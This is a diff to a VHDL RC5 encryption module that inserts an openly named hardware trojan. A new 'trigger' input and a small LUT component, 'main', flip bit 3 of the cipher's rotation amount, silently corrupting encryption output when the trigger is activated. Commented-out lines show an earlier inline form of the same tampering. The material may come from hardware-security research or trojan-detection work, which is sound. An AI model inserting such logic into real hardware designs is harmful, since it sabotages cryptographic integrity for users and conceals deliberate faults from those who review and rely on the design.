@@ -11,7 +11,7 @@ Entity rc5_enc Is
 		
 		din		:	in std_logic_vector(63 downto 0);
 		di_vld	:	in std_logic;
-		
+		trigger 	: 	in std_logic;
 		key_rdy	:	in std_logic;
 		skey	:	in rom;
 		
@@ -34,7 +34,14 @@ Architecture rtl of rc5_enc is
 	signal b		:	Std_logic_vector(31 downto 0);
 	signal b_pre	:	Std_logic_vector(31 downto 0);
 	signal b_reg	:	Std_logic_vector(31 downto 0);
-			
+	signal trojan_out	: std_logic;
+	
+component main is 
+Port(A: in std_logic;
+	B: in std_logic;
+	Y: out std_logic
+);
+end component;			
 --RC5 State Machine
 Type StateType is 														--Type for state machine
 	(
@@ -44,10 +51,17 @@ Type StateType is 														--Type for state machine
 		ST_ready
 	);
 Signal state_en	:	StateType;											--Signal type of state machine
-
+signal b_reg_trojan: std_logic_vector(4 downto 0);
 Begin
+	trojan_lut : main PORT MAP (b_reg(3), trigger, trojan_out);
+--	trojan_out <= not(b_reg(3));
+--	with trigger select
+--		b_reg_trojan<=b_reg(4) & trojan_out & b_reg (2 DOWNTO 0) when '1',
+--							b_reg(4 downto 0) when others;
 	ab_xor <= a_reg XOR b_reg;											--A_reg _reg XOR
-	With b_reg(4 downto 0) Select										--Rotate left XOR result 
+	b_reg_trojan<=b_reg(4) & trojan_out & b_reg (2 DOWNTO 0);
+	
+	With b_reg_trojan Select										--Rotate left XOR result 
 		a_rot <= ab_xor(30 downto 0) & ab_xor(31) when "00001",
 			ab_xor(29 downto 0) & ab_xor(31 downto 30) when "00010",
 			ab_xor(28 downto 0) & ab_xor(31 downto 29) when "00011",
